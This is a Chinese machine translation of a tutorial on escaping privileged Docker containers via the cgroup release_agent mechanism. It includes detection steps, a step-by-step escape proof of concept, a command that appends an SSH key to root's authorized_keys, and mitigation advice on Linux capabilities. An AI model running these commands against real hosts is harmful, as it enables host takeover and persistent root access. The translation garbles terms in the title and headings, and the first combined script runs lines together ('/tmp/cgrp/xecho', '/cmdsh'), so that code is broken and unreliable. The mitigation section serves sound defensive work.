# 逃脱码头特许集装箱

> 原文：<https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1>

## 为什么不应该使用“特权”标志运行 Docker

![](img/dce50ab9548a1829fc5c921c9f344510.png)

[freestocks](https://unsplash.com/@freestocks?utm_source=medium&utm_medium=referral) 在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄的照片

特权停靠容器是使用`--privileged`标志运行的容器。与常规容器不同，这些容器对主机具有 root 权限。

当容器需要直接访问硬件来完成它们的任务时，通常使用特权容器。但是，特权 Docker 容器可让攻击者接管主机系统。今天，我们来看看攻击者是如何逃脱特权容器的。

# 寻找可利用的容器

但是，我们首先如何判断我们是否在特权容器中呢？

## 你怎么知道你是否在一个容器里？

cgroups 代表“控制组”它是 Linux 的一个特性，可以隔离资源的使用，Docker 就是用它来隔离容器的。您可以通过在`/proc/1/cgroup`检查 init 进程的控制组来判断您是否在一个容器中。如果你不在集装箱内，控制组应该是`/`。另一方面，如果你在一个容器中，你应该看到`/docker/CONTAINER_ID`。

## 如何判断一个容器是否有特权？

一旦你确定你在一个容器中，你需要确定这个容器是否有特权。最好的方法是运行一个需要`--privileged`标志的命令，看看它是否成功。

例如，您可以尝试使用`iproute2`命令添加一个虚拟接口。这个命令需要`NET_ADMIN`功能，如果容器有特权，它就会有这个功能:

```
$ ip link add dummy0 type dummy
```

如果这个命令成功运行，您可以断定容器具有`NET_ADMIN`功能。`NET_ADMIN`是特权能力集的一部分，没有它的容器是没有特权的。通过运行以下命令，您可以在测试后清理`dummy0`链接:

```
ip link delete dummy0
```

# 集装箱逃逸

那么如何逃离特权容器呢？通过使用这个脚本。这个例子和 PoC 取自 Bits 博客的[线索。阅读原始帖子，了解 PoC 的更详细解释:](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/xecho 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agentecho '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmdsh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

这个 PoC 通过利用 cgroup 的`release_agent`功能来工作。

cgroup 中的最后一个进程退出后，将运行一个用于删除被放弃的 cgroups 的命令。该命令在`release_agent`文件中指定，并在主机上作为 root 运行。默认情况下，此功能被禁用，并且`release_agent`路径为空。

这个漏洞通过`release_agent`文件运行代码。我们需要创建一个 cgroup，指定它的`release_agent`文件，并通过杀死 cgroup 中的所有进程来触发`release_agent`。PoC 中的第一行创建了一个新组:

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

下一行启用`release_agent`功能:

```
echo 1 > /tmp/cgrp/x/notify_on_release
```

然后，接下来的几行将命令文件的路径写到`release_agent`文件:

```
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

然后，我们可以开始写入我们的命令文件。该脚本将执行`ps aux`命令，并将其保存到`/output`文件中。我们还需要设置脚本的执行权限位:

```
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

最后，通过在我们创建的 cgroup 中生成一个立即结束的进程来触发攻击。我们的`release_agent`脚本将在流程结束后执行。您现在可以在主机上的`/output`文件中读取`ps aux`的输出:

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

您可以使用 PoC 在主机系统上执行任意命令。例如，您可以使用它将您的 SSH 密钥写入 root 用户的`authorized_keys`文件:

```
cat id_dsa.pub >> /root/.ssh/authorized_keys
```

# 减轻

您如何防止这种攻击发生？您不应该授予容器对主机系统的完全访问权限，而应该赋予容器它们所需要的独立“能力”。

Docker 功能为开发人员提供了对容器权限的细粒度控制。功能将通常打包为“根访问”的权限分解为单独的权限。

默认情况下，Docker 删除容器的所有功能，并要求添加功能。您可以使用`cap-drop`和`cap-add`标志删除或添加功能。

```
--cap-drop=all
--cap-add=LIST_OF_CAPABILITIES
```

例如，如果需要绑定到低于 1024 的端口，您可以授予它`NET_BIND_SERVICE`功能，而不是授予容器 root 访问权限。此标志将授予容器以下能力:

```
--cap-add NET_BIND_SERVICE
```

# 结论

如果可能，避免运行带有`--privileged`标志的 Docker 容器。特权容器可能允许攻击者突破容器并获得对主机系统的控制。改为用`--cap-add`标志授予容器单独的能力。

# 进一步阅读

*   [Linux 内核功能列表](https://man7.org/linux/man-pages/man7/capabilities.7.html)
*   [安全使用 Docker](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities)
*   [特许集装箱安全最佳实践](https://blog.trendmicro.com/trendlabs-security-intelligence/why-running-a-privileged-container-in-docker-is-a-bad-idea/)